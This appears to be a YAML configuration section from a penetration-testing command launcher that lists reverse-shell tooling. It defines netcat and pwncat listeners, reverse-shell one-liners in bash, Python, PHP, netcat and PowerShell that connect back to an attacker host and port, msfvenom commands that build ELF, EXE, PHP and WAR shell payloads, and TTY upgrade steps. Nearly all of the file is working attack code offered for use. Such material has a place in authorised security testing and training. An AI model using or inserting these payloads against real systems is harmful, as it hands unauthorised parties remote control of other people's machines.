  # ============================================================================
  #  REVERSE SHELLS
  # ============================================================================

  shells:
    name: "ðŸš Reverse Shells"
    tools:

      nc_listen:
        name: "NC Listener"
        description: "Start netcat listener"
        command: "nc -lvnp {port}"
        params:
          - port

      rlwrap_listen:
        name: "Rlwrap NC"
        description: "Better listener (arrows work)"
        command: "rlwrap nc -lvnp {port}"
        params:
          - port

      pwncat:
        name: "Pwncat Listener"
        description: "Advanced listener"
        command: "pwncat-cs -lp {port}"
        params:
          - port

      bash_rev:
        name: "Bash Reverse Shell"
        description: "Generate bash shell"
        command: "echo 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
        params:
          - lhost
          - lport

      python_rev:
        name: "Python Reverse Shell"
        description: "Generate python shell"
        command: >
          echo 'python3 -c '\''import socket,subprocess,os;
          s=socket.socket();s.connect(("{lhost}",{lport}));
          os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
          subprocess.call(["/bin/sh","-i"])'\'
        params:
          - lhost
          - lport

      php_rev:
        name: "PHP Reverse Shell"
        description: "Generate PHP shell"
        command: >
          echo 'php -r '\''$sock=fsockopen("{lhost}",{lport});
          exec("/bin/sh -i <&3 >&3 2>&3");'\'
        params:
          - lhost
          - lport

      nc_rev:
        name: "Netcat Reverse"
        description: "NC with -e"
        command: "echo 'nc {lhost} {lport} -e /bin/bash'"
        params:
          - lhost
          - lport

      nc_mkfifo:
        name: "NC FIFO Reverse"
        description: "NC without -e"
        command: "echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f'"
        params:
          - lhost
          - lport

      ps_rev:
        name: "PowerShell Reverse"
        description: "Windows PS shell"
        command: >
          echo 'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('\''{lhost}'\'',{lport});
          $s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};
          while(($i=$s.Read($b,0,$b.Length)) -ne 0){{
          $d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);
          $r=(iex $d 2>&1|Out-String);$s.Write(([text.encoding]::ASCII).GetBytes($r),0,$r.Length)}}"'
        params:
          - lhost
          - lport

      msf_linux:
        name: "Msfvenom Linux"
        description: "Generate ELF binary"
        command: "msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
        params:
          - lhost
          - lport

      msf_windows:
        name: "Msfvenom Windows"
        description: "Generate EXE"
        command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o shell.exe"
        params:
          - lhost
          - lport

      msf_php:
        name: "Msfvenom PHP"
        description: "Generate PHP shell"
        command: "msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > shell.php"
        params:
          - lhost
          - lport

      msf_war:
        name: "Msfvenom WAR"
        description: "For Tomcat"
        command: "msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war -o shell.war"
        params:
          - lhost
          - lport

      shell_upgrade:
        name: "Upgrade Shell"
        description: "Get proper TTY"
        command: >
          echo 'python3 -c "import pty;pty.spawn(\"/bin/bash\")"' &&
          echo 'Then: Ctrl+Z' &&
          echo 'stty raw -echo; fg' &&
          echo 'export TERM=xterm'
        params: []


